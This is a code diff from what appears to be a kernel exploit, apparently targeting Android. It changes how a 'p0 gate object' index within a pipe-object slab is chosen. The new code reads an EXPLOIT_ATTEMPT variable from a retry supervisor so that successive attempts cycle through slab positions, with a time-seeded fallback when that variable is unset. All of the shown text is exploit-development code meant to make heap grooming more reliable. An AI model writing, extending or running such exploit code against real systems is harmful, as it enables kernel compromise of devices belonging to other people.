@@ -94,22 +94,27 @@ void select_p0_gate_object_index(void) {
       value = 0;
     }
     g_p0_gate_object_index = value % (int)PIPE_OBJS_PER_SLAB;
-    pr_info("p0 gate object index forced=%d\n", g_p0_gate_object_index);
+    pr_info("p0 gate object index from env=%d (of %d)\n",
+            g_p0_gate_object_index, (int)PIPE_OBJS_PER_SLAB);
+    return;
+  }
+  const char *attempt_env = getenv("EXPLOIT_ATTEMPT");
+  if (attempt_env && attempt_env[0]) {
+    int attempt = atoi(attempt_env);
+    if (attempt < 1) {
+      attempt = 1;
+    }
+    g_p0_gate_object_index = (attempt - 1) % (int)PIPE_OBJS_PER_SLAB;
+    pr_info("p0 gate object index from attempt=%d -> %d (of %d)\n",
+            attempt, g_p0_gate_object_index, (int)PIPE_OBJS_PER_SLAB);
     return;
   }
 #if defined(P0_ORACLE_GATE_OBJECT_INDEX_ROTATE) && \
     P0_ORACLE_GATE_OBJECT_INDEX_ROTATE
-  static int rotate;
-  const char *idx_env = getenv("P0_GATE_INDEX_SEED");
-  if (idx_env && idx_env[0] && rotate == 0) {
-    rotate = atoi(idx_env);
-    if (rotate < 0) {
-      rotate = 0;
-    }
-  }
-  g_p0_gate_object_index = rotate % (int)PIPE_OBJS_PER_SLAB;
-  rotate++;
-  pr_info("p0 gate object index rotate=%d (of %d)\n",
+  /* Fallback when supervisor did not set attempt (standalone / adb). */
+  g_p0_gate_object_index =
+      (int)((gettime_ns() / 1000000ULL) % (unsigned long long)PIPE_OBJS_PER_SLAB);
+  pr_info("p0 gate object index time-seeded=%d (of %d)\n",
           g_p0_gate_object_index, (int)PIPE_OBJS_PER_SLAB);
 #else
   g_p0_gate_object_index = P0_ORACLE_GATE_OBJECT_INDEX;
